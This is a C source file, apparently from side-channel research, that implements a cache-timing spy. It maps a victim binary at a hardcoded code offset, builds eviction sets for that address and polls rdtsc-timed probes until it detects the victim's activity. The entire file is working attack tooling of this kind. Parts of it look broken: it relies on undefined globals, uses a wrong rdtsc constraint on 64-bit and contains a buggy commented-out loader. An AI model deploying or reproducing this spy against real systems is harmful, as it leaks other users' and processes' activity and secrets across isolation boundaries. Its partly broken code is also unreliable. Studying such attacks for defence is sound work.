#include "evset-timings.c"
#include <sys/stat.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <x86intrin.h>
#include <errno.h>

static Node **spy_evsets = NULL;
static void *victim;
static int map_len;

void *map(char *file_name, uint64_t offset)
{
    int file_descriptor = open(file_name, O_RDONLY); 
    if (file_descriptor == -1) return NULL;
    struct stat st_buf;
    if (fstat(file_descriptor, &st_buf) == -1) return NULL;
    size_t map_len = st_buf.st_size;
	void *mapping = mmap(NULL, map_len, PROT_READ, MAP_PRIVATE, file_descriptor, 0);
	if (mapping == MAP_FAILED){
		printf("mmap fail with errno %d\n", errno); // fix problems with mmap
		return NULL;
	}
	close(file_descriptor);
	return (void *)(((uint64_t) mapping) + offset);  // mapping will be implicitly unmapped when calling function will be exited
}

// load probe adresses from file
// void *target_loader(char *file_path)
// {
//     printf("a\n");
//     FILE *fp = fopen(file_path, "r");
//     char *line = NULL;
//     size_t len = 0;
//     ssize_t read;

//     printf("a\n");
//     if (fp == NULL)
//     {
//         perror("Error reading adress file (fopen)!\n");
//         exit(EXIT_FAILURE);
//     }
    
//     printf("a\n");
//     // init linked list
//     void *spy_target;
//     // https://linux.die.net/man/3/getline
//     // read line for line and parse linewise read string to pointers
//     while ((read = getline(&line, &len, fp)) != -1) {
        
//     printf("a\n");
//         (&line)[strlen(line)-1] = "\0"; //delete "\n"
//         spy_target = (void *)strtol(line, NULL, 16); // make read string to pointer
               
//     printf("a\n");
//     }

//     printf("a\n");
//     fclose(fp);
//     free(line);

//     // returns last target adrs (expands later)
//     return spy_target;
// }

// void victim_reader(char *filepath){
//     FILE *fp = fopen(filepath, "r");
//     int fd = fileno(fp);
//     struct stat st_buf;
//     fstat(fd, &st_buf);
//     map_len = st_buf.st_size;
//     victim = mmap(NULL, map_len, PROT_READ, MAP_SHARED, fd, 0);
//     if (victim == MAP_FAILED) {
//         perror("mmap victim failed!");
//         exit(EXIT_FAILURE);
//     }
// }

void init_spy(char *target_filepath, int offset_target){
    printf("init spy\n");
    // load victim 
    // victim_reader(target_filepath);
    victim = map(target_filepath, offset_target);
    printf("victim read\n");

    // prepare evset
    Config *spy_conf= config_init(24, 2048, 64, 105, 2097152, 1, 1);
    init_evset(spy_conf);
    printf("init evset done\n");
    spy_evsets = find_evset(spy_conf, victim);
    printf("find evset done\n");
    
    printf("[+] spy evset for target adrs %p\n", victim);
    list_print(spy_evsets);
}

uint64_t my_detect(void *spy_target){
    my_access(spy_target);       
    traverse_list0(*spy_evsets);
    my_access(spy_target+222);

    // measure access time for one entry
    return probe_chase_loop(spy_target, 1);       
}

static __inline__ unsigned long long rdtsc(void)
{
    unsigned long long int x;
    __asm__ __volatile__ ("rdtsc" : "=A" (x));
    return x;
}

void my_monitor(void *spy_target){
    uint64_t detected=0;
    unsigned long long old_tsc, tsc = rdtsc();
    my_detect(spy_target);
    while(1)
    {
        old_tsc = tsc;
        tsc=rdtsc();
        while (tsc - old_tsc < 2500) // TODO why 2500/500 cycles per slot now, depending on printf
        {
            tsc = rdtsc();
        }
        detected= my_detect(spy_target);
        if(detected > conf->threshold) break;
    }
    printf("[!] victim acitivity detected!\n");
    for(int i=0;i<1000;i++) printf("%lu; ", msrmts[i]);
}

void spy(char *victim_filepath, int offset_target){
    init_spy(victim_filepath, offset_target);
    printf("[+] spy init complete, monitoring %p now...\n", victim);
    my_monitor(victim);
}

int main(int ac, char **av){  
    printf("%s\n", av[1]); // first char file path
    printf("%s\n", av[2]); // second file path later, rn hardcoded location 
    int my_target = 0x1180; 
    //0x1174; // alder lake
    // my_access(my_target);
    printf("%d\n", my_target);
    // printf("%p\n", target_loader(av[2]));
    spy(av[1], my_target);
}